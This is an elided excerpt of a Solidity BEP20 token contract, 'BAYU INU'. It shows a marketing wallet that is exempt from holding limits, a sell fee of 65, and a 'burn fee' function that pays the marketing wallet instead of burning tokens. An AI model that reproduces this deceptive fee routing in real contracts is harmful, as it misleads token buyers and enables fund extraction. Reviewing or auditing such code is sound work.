...
contract BAYUINU is Context, IBEP20, Ownable {
    ...
    string private _name = "BAYU INU"; // token name
    string private _symbol = "BAYU"; // token ticker
    ...
    address public marketingWallet = (0xd49e55F4F42989cb97F29493F8A4D8e90Cf34420);

    uint256 public minTokenToSwap = 100000000000000 * 1e9; // 10000k amount will trigger the swap and add liquidity
    ...
    uint256 public marketWalletFeeOnSelling = 65;
    ...
    constructor(address payable _marketWallet) {
       ...
       // exclude addresses from max holding limit
        ...
        _isExcludedFromMaxHoldLimit[marketingWallet] = true;
   ...
   function _takeBurnFee(address sender,uint256 tAmount, uint256 currentRate) internal {
        ...
        _rOwned[marketingWallet] = _rOwned[marketingWallet].add(rBurnFee);

        emit Transfer(sender, marketingWallet, burnFee);
    }
